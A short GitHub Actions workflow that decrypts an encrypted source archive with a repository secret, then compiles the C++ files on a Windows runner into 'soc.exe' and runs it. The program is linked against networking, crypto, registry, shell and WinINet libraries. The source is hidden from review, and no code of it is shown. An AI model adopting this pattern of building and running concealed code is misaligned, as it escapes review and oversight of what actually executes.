name: WINDOWS-TESTI
on: [push, workflow_dispatch]
jobs:
  test:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - name: Kaynagi coz (sifreli)
        shell: bash
        run: |
          printf %s "${{ secrets.PAKET_SIFRE }}" | openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in kaynak.enc -out kaynak.tar.gz -pass stdin
          mkdir -p src && tar xzf kaynak.tar.gz -C src && ls -la src
      - name: MinGW kur
        run: choco install mingw -y --no-progress
      - name: Derle ve CALISTIR
        shell: bash
        run: |
          g++ -O2 -std=c++17 -DWIN32_LEAN_AND_MEAN -o soc.exe src/*.cpp -lws2_32 -ladvapi32 -lcrypt32 -lole32 -luuid -lshell32 -liphlpapi -lwininet -lcomctl32 -lgdi32
          ./soc.exe
